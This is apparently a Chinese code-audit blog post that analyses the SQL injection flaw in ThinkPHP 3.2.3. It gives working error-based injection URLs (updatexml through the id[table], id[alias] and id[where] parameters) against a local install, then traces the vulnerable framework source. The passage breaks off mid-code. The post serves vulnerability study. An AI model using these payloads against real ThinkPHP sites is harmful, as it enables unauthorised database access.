@@ -1,0 +1,1579 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+<link rel="stylesheet" href="/css/main.css?v=7.1.2">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.2">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.1.2">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.1.2">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.1.2" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.1.2',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: false,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="前言近段时间一直在学习tp3，终于搞清楚运作流程，也顺便分析下tp3.2.3爆出的注入漏洞。">
+<meta name="keywords" content="web安全,代码审计">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ThinkPHP3.2.3注入分析">
+<meta property="og:url" content="https://songxpu.github.io/2019/11/15/代码审计/ThinkPHP/thinkphp3.2.3注入分析/index.html">
+<meta property="og:site_name" content="Pines404">
+<meta property="og:description" content="前言近段时间一直在学习tp3，终于搞清楚运作流程，也顺便分析下tp3.2.3爆出的注入漏洞。">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/15/代码审计/ThinkPHP/thinkphp3.2.3注入分析/12.png">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/15/代码审计/ThinkPHP/thinkphp3.2.3注入分析/1.png">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/15/代码审计/ThinkPHP/thinkphp3.2.3注入分析/3.png">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/15/代码审计/ThinkPHP/thinkphp3.2.3注入分析/2.png">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/15/代码审计/ThinkPHP/thinkphp3.2.3注入分析/5.png">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/15/代码审计/ThinkPHP/thinkphp3.2.3注入分析/6.png">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/15/代码审计/ThinkPHP/thinkphp3.2.3注入分析/7.png">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/15/代码审计/ThinkPHP/thinkphp3.2.3注入分析/8.png">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/15/代码审计/ThinkPHP/thinkphp3.2.3注入分析/9.png">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/15/代码审计/ThinkPHP/thinkphp3.2.3注入分析/10.png">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/15/代码审计/ThinkPHP/thinkphp3.2.3注入分析/11.png">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/15/代码审计/ThinkPHP/thinkphp3.2.3注入分析/4.png">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/15/代码审计/ThinkPHP/thinkphp3.2.3注入分析/14.png">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/15/代码审计/ThinkPHP/thinkphp3.2.3注入分析/13.png">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/15/代码审计/ThinkPHP/thinkphp3.2.3注入分析/15.png">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/15/代码审计/ThinkPHP/thinkphp3.2.3注入分析/16.png">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/15/代码审计/ThinkPHP/thinkphp3.2.3注入分析/17.png">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/15/代码审计/ThinkPHP/thinkphp3.2.3注入分析/19.png">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/15/代码审计/ThinkPHP/thinkphp3.2.3注入分析/18.png">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/15/代码审计/ThinkPHP/thinkphp3.2.3注入分析/22.png">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/15/代码审计/ThinkPHP/thinkphp3.2.3注入分析/20.png">
+<meta property="og:image" content="https://songxpu.github.io/2019/11/15/代码审计/ThinkPHP/thinkphp3.2.3注入分析/21.png">
+<meta property="og:updated_time" content="2019-12-14T12:43:29.275Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ThinkPHP3.2.3注入分析">
+<meta name="twitter:description" content="前言近段时间一直在学习tp3，终于搞清楚运作流程，也顺便分析下tp3.2.3爆出的注入漏洞。">
+<meta name="twitter:image" content="https://songxpu.github.io/2019/11/15/代码审计/ThinkPHP/thinkphp3.2.3注入分析/12.png">
+
+
+
+
+
+  
+  
+  <link rel="canonical" href="https://songxpu.github.io/2019/11/15/代码审计/ThinkPHP/thinkphp3.2.3注入分析/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>ThinkPHP3.2.3注入分析 | Pines404</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Pines404</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">穷究于理，成就于工</p>
+      
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签<span class="badge">18</span></a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类<span class="badge">5</span></a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档<span class="badge">32</span></a>
+
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+  
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://songxpu.github.io/2019/11/15/代码审计/ThinkPHP/thinkphp3.2.3注入分析/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Azeroth">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pines404">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">ThinkPHP3.2.3注入分析
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-11-15 18:45:03" itemprop="dateCreated datePublished" datetime="2019-11-15T18:45:03+08:00">2019-11-15</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-12-14 20:43:29" itemprop="dateModified" datetime="2019-12-14T20:43:29+08:00">2019-12-14</time>
+              
+            
+          </span>
+		  
+		  
+			<span class="post-updated">
+			&nbsp; | &nbsp; 更新于
+			<time itemprop="dateUpdated" datetime="2019-12-14T20:43:29+08:00" content="2019-12-14">
+			  2019-12-14
+			</time>
+		  </span>
+		  
+
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/代码审计/" itemprop="url" rel="index"><span itemprop="name">代码审计</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon">
+            <i class="fa fa-eye"></i>
+             阅读次数： 
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+            <div class="post-symbolscount">
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">本文字数：</span>
+                
+                <span title="本文字数">18k</span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">17 分钟</span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>近段时间一直在学习tp3，终于搞清楚运作流程，也顺便分析下tp3.2.3爆出的注入漏洞。</p>
+<a id="more"></a>
+
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>利用git下载漏洞修复之前的版本</p>
+<p>下载源码： <code>git clone https://github.com/top-think/thinkphp.git</code></p>
+<p>使用git checkout 命令将版本回退到上一次commit：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout 109bf30254a38651c21837633d9293a4065c300b</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="find-和select"><a href="#find-和select" class="headerlink" title="find()和select()"></a>find()和select()</h3><blockquote>
+<p>find()和select()函数处理流程相似，差别在于find存在limit 1限制，仅返回一条记录</p>
+<p>本部分以find()为例</p>
+</blockquote>
+<h4 id="审计复现"><a href="#审计复现" class="headerlink" title="审计复现"></a>审计复现</h4><h5 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h5><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">table：</span><br><span class="line"><span class="link">http://127.0.0.1/tp3_2/Home/Index/sql?id</span>[<span class="string">table</span>]=user%20where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--</span><br><span class="line"></span><br><span class="line">alias：</span><br><span class="line"><span class="link">http://127.0.0.1/tp3_2/Home/Index/sql?id</span>[<span class="string">alias</span>]=where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--</span><br><span class="line"></span><br><span class="line">where: </span><br><span class="line"><span class="link">http://127.0.0.1/tp3_2/Home/Index/sql?id</span>[<span class="string">where</span>]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>IndexController控制器：<code>Home/Home/Controller/IndexController.class.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sql</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//实例化数据模型</span></span><br><span class="line">        $model=M(<span class="string">'user'</span>);</span><br><span class="line">        <span class="comment">//接收数据</span></span><br><span class="line">        $id=I(<span class="string">'id'</span>);</span><br><span class="line">        $res=$model-&gt;find($id);</span><br><span class="line">    	<span class="comment">//$res=$model-&gt;select($id);</span></span><br><span class="line">        print_r($res);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="table"><a href="#table" class="headerlink" title="table"></a>table</h5><blockquote>
+<p>传入第一个payload</p>
+<p>?id[table]=user%20where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)–</p>
+</blockquote>
+<p>函数调用流程</p>
+<img src="//songxpu.github.io/2019/11/15/代码审计/ThinkPHP/thinkphp3.2.3注入分析/12.png" width>
+
+<p>进入到<code>public function find($options = array())</code>方法内</p>
+<blockquote>
+<p>文件位置：ThinkPHP/Library/Think/Model.class.php</p>
+</blockquote>
+<p>payload中参数id是以数组形式传入，则函数体内<code>$options=array(&#39;table&#39;=&gt;&#39;user where........&#39;)</code></p>
+<p>首先经过第一次if判断，但此处由于$options是以数组形式，因此绕过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (is_numeric($options) || is_string($options)) &#123;</span><br><span class="line">            $where[<span class="keyword">$this</span>-&gt;getPk()] = $options;</span><br><span class="line">            $options               = <span class="keyword">array</span>();</span><br><span class="line">            $options[<span class="string">'where'</span>]      = $where;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 根据复合主键查找记录</span></span><br><span class="line">$pk = <span class="keyword">$this</span>-&gt;getPk();<span class="comment">// 将当前表的主键赋值给$pk</span></span><br></pre></td></tr></table></figure>
+
+<p>$pk的值是当前表的主键信息：</p>
+<blockquote>
+<p>若当前表仅有一个主键，则$pk的值为string</p>
+<p>若当前表有多个主键，这$pk的值是以数组的形式存在</p>
+<p>该值在本漏洞中非常重要，当$pk为string类型时，会导致接下来的部分判断绕过；否则payload不生效</p>
+</blockquote>
+<p>接下来的语句块是根据复合主键查询，因此处表为单主键，$pk为字符串类型，因此绕过判断</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (is_array($options) &amp;&amp; (count($options) &gt; <span class="number">0</span>) &amp;&amp; is_array($pk)) &#123;</span><br><span class="line">    <span class="comment">// 根据复合主键查询</span></span><br><span class="line">    .........</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 总是查找一条记录</span></span><br><span class="line">$options[<span class="string">'limit'</span>] = <span class="number">1</span>;</span><br><span class="line">$options = <span class="keyword">$this</span>-&gt;_parseOptions($options);</span><br></pre></td></tr></table></figure>
+
+<p>进入到<code>_parseOptions($options)</code>函数体中</p>
+<p><code>$options</code>可控，同时本次payload中<code>$options</code>仅存在table字段，不存在where字段，可顺利通过函数验证</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">_parseOptions</span><span class="params">($options = array<span class="params">()</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_array($options)) &#123;</span><br><span class="line">            $options = array_merge(<span class="keyword">$this</span>-&gt;options, $options);</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * array_merge()将一个或多个数组合并成一个数组</span></span><br><span class="line"><span class="comment">             * 本处$this-&gt;options为空</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>($options[<span class="string">'table'</span>])) &#123;<span class="comment">//option中无table下标时</span></span><br><span class="line">            <span class="comment">// 自动获取表名</span></span><br><span class="line">            $options[<span class="string">'table'</span>] = <span class="keyword">$this</span>-&gt;getTableName();<span class="comment">//$option中添加 'table'=&gt;'[表名]'</span></span><br><span class="line">            $fields           = <span class="keyword">$this</span>-&gt;fields;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 指定数据表 则重新获取字段列表 但不支持类型检测</span></span><br><span class="line">            $fields = <span class="keyword">$this</span>-&gt;getDbFields();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 数据表别名</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>($options[<span class="string">'alias'</span>])) &#123;</span><br><span class="line">            $options[<span class="string">'table'</span>] .= <span class="string">' '</span> . $options[<span class="string">'alias'</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 记录操作的模型名称</span></span><br><span class="line">        $options[<span class="string">'model'</span>] = <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">        <span class="comment">// 字段类型验证</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($options[<span class="string">'where'</span>]) &amp;&amp; is_array($options[<span class="string">'where'</span>]) &amp;&amp; !<span class="keyword">empty</span>($fields) &amp;&amp; !<span class="keyword">isset</span>($options[<span class="string">'join'</span>])) &#123;</span><br><span class="line">            <span class="comment">// 对数组查询条件进行字段类型检查</span></span><br><span class="line">            <span class="keyword">foreach</span> ($options[<span class="string">'where'</span>] <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">                $key = trim($key);</span><br><span class="line">                <span class="keyword">if</span> (in_array($key, $fields, <span class="keyword">true</span>)) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (is_scalar($val)) &#123;</span><br><span class="line">                        <span class="comment">/*</span></span><br><span class="line"><span class="comment">                         * is_scalar($var)：检测变量是否是一个标量</span></span><br><span class="line"><span class="comment">                         * 标量变量是指那些包含了 integer、float、string 或 boolean的变量</span></span><br><span class="line"><span class="comment">                         */</span></span><br><span class="line">                        <span class="keyword">$this</span>-&gt;_parseType($options[<span class="string">'where'</span>], $key);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 查询过后清空sql表达式组装 避免影响下次查询</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;options = <span class="keyword">array</span>();</span><br><span class="line">        <span class="comment">// 表达式过滤</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_options_filter($options);</span><br><span class="line">        <span class="keyword">return</span> $options;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>往下进入到<code>select()</code>方法中</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$resultSet = <span class="keyword">$this</span>-&gt;db-&gt;select($options);</span><br><span class="line"><span class="comment">#select()方法体</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span><span class="params">($options = array<span class="params">()</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;model = $options[<span class="string">'model'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;parseBind(!<span class="keyword">empty</span>($options[<span class="string">'bind'</span>]) ? $options[<span class="string">'bind'</span>] : <span class="keyword">array</span>());</span><br><span class="line">        $sql    = <span class="keyword">$this</span>-&gt;buildSelectSql($options);</span><br><span class="line">        $result = <span class="keyword">$this</span>-&gt;query($sql, !<span class="keyword">empty</span>($options[<span class="string">'fetch_sql'</span>]) ? <span class="keyword">true</span> : <span class="keyword">false</span>, !<span class="keyword">empty</span>($options[<span class="string">'master'</span>]) ? <span class="keyword">true</span> : <span class="keyword">false</span>);</span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>再进入到select方法体中<code>buildSelectSql()</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">buildSelectSql</span><span class="params">($options = array<span class="params">()</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($options[<span class="string">'page'</span>])) &#123;</span><br><span class="line">            <span class="comment">// 根据页数计算limit</span></span><br><span class="line">            ....</span><br><span class="line">        &#125;</span><br><span class="line">        $sql = <span class="keyword">$this</span>-&gt;parseSql(<span class="keyword">$this</span>-&gt;selectSql, $options);</span><br><span class="line">        <span class="keyword">return</span> $sql;<span class="comment">//SELECT * FROM `user` WHERE 1 and updatexml(1,concat(0x7e,user(),0x7e),1)-- LIMIT 1</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>进入到<code>parseSql()</code>中，该方法主要用来利于前面获取的各字段信息，拼接SQL语句。</p>
+<p>在此方法中，直接取出$options[‘table’]的值作为查询语句中的table</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">parseSql</span><span class="params">($sql, $options = array<span class="params">()</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $sql = str_replace(</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">'%TABLE%'</span>, <span class="string">'%DISTINCT%'</span>, <span class="string">'%FIELD%'</span>, <span class="string">'%JOIN%'</span>, <span class="string">'%WHERE%'</span>, <span class="string">'%GROUP%'</span>, <span class="string">'%HAVING%'</span>, <span class="string">'%ORDER%'</span>, <span class="string">'%LIMIT%'</span>, <span class="string">'%UNION%'</span>, <span class="string">'%LOCK%'</span>, <span class="string">'%COMMENT%'</span>, <span class="string">'%FORCE%'</span>),</span><br><span class="line">            <span class="keyword">array</span>(</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseTable($options[<span class="string">'table'</span>]),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseDistinct(<span class="keyword">isset</span>($options[<span class="string">'distinct'</span>]) ? $options[<span class="string">'distinct'</span>] : <span class="keyword">false</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseField(!<span class="keyword">empty</span>($options[<span class="string">'field'</span>]) ? $options[<span class="string">'field'</span>] : <span class="string">'*'</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseJoin(!<span class="keyword">empty</span>($options[<span class="string">'join'</span>]) ? $options[<span class="string">'join'</span>] : <span class="string">''</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseWhere(!<span class="keyword">empty</span>($options[<span class="string">'where'</span>]) ? $options[<span class="string">'where'</span>] : <span class="string">''</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseGroup(!<span class="keyword">empty</span>($options[<span class="string">'group'</span>]) ? $options[<span class="string">'group'</span>] : <span class="string">''</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseHaving(!<span class="keyword">empty</span>($options[<span class="string">'having'</span>]) ? $options[<span class="string">'having'</span>] : <span class="string">''</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseOrder(!<span class="keyword">empty</span>($options[<span class="string">'order'</span>]) ? $options[<span class="string">'order'</span>] : <span class="string">''</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseLimit(!<span class="keyword">empty</span>($options[<span class="string">'limit'</span>]) ? $options[<span class="string">'limit'</span>] : <span class="string">''</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseUnion(!<span class="keyword">empty</span>($options[<span class="string">'union'</span>]) ? $options[<span class="string">'union'</span>] : <span class="string">''</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseLock(<span class="keyword">isset</span>($options[<span class="string">'lock'</span>]) ? $options[<span class="string">'lock'</span>] : <span class="keyword">false</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseComment(!<span 